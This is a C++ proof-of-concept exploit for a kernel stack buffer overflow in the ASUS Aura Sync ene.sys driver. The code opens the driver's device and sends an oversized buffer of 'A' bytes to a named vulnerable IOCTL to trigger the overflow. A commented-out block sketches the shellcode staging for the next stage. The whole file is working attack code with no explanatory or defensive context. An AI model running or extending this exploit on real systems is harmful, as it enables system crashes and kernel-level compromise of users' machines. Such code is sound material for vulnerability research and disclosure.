#include <windows.h>
#include <iostream>

#define DEVICE_NAME "\\\\.\\EneIo"
#define VULNERABLE_IOCTL 0x80102050

int main() {

	std::cout << "\nASUS Aura Sync : ene.sys kernel stack buffer overflow\n\n";

	HANDLE hDevice = CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL, NULL);

	if (hDevice == INVALID_HANDLE_VALUE) {
		std::cout << "Failed to set up the handle for our device - " << GetLastError() << std::endl;
	}
	else {
		std::cout << "Success in setting up the handle for our device - " << DEVICE_NAME << std::endl;
	}

	DWORD sizeReturn = 0;

	/*
	char shellcodePayload[] = "\x41\x41\x41\x41";
	LPVOID shellcode_address = VirtualAlloc(NULL,sizeof(shellcodePayload),MEM_RESERVE | MEM_COMMIT,PAGE_EXECUTE_READWRITE);
	memcpy(shellcode_address, shellcodePayload, sizeof(shellcodePayload));
	*/

	BYTE userBuffer[48] = { 0 };
	memset(userBuffer, '\x41', 48);

	std::cout << "Sending usermode buffer to trigger vulnerability: " << userBuffer << std::endl;

	int deviceCom = DeviceIoControl(hDevice, 0x80102050, userBuffer, sizeof(userBuffer), NULL, 0, &sizeReturn, NULL);

	if (!deviceCom) {
		std::cout << "Failed to send payload to the device driver\n";
	}

	return 0;

}